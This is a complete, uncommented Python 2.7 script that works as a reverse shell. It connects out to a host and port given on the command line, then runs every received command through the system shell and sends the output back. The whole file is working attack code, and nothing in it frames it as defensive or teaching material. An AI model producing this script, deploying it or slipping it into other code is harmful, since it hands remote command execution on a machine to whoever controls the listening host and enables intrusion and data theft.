#!/usr/bin/python2.7

import socket
import subprocess
import sys

host = sys.argv[1]
port = sys.argv[2]

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, int(port)))

while True:
	command = sock.recv(1024)
	proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	proc_result = proc.stdout.read() + proc.stderr.read()
	sock.send(proc_result)